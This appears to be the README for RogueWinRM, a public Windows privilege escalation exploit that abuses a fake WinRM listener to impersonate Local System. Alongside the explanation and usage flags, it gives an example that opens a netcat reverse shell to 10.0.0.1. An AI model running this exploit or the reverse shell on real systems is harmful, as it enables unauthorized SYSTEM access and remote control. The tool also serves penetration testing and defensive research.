# RogueWinRM

RogueWinRM is a local privilege escalation exploit that allows to escalate from a Service account (with SeImpersonatePrivilege) to Local System account if WinRM service is not running (**default on Win10 but NOT on Windows Server 2019**).

Briefly, it will listen for incoming connection on port 5985 faking a real WinRM service.<br>
It's just a minimal webserver that will try to negotiate an NTLM authentication with any service that are trying to connect on that port.<br>
Then the BITS service (running as Local System) is triggered and it will try to authenticate to our rogue listener. Once authenticated to our rogue listener, we are able to impersonate the Local System user spawning an arbitrary process with those privileges.

You can find a full technical description of this vulnerability at this link --> https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/

# Usage

```
RogueWinRM

Mandatory args:
-p <program>: program to launch

Optional args:
-a <argument>: command line argument to pass to program (default NULL)
-l <port>: listening port (default 5985 WinRM)
-d : Enable Debugging output
```

# Examples

![RogueWinRM](https://decoderblogblog.files.wordpress.com/2019/12/exploit-1.png)

Running an interactive cmd:

```
RogueWinRM.exe -p C:\windows\system32\cmd.exe
```

Running netcat reverse shell:

```
RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "10.0.0.1 3001 -e cmd"
```

# Authors

* [Antonio Cocomazzi](https://twitter.com/splinter_code)
* [Andrea Pierini](https://twitter.com/decoder_it)
* Roberto (0xea31)
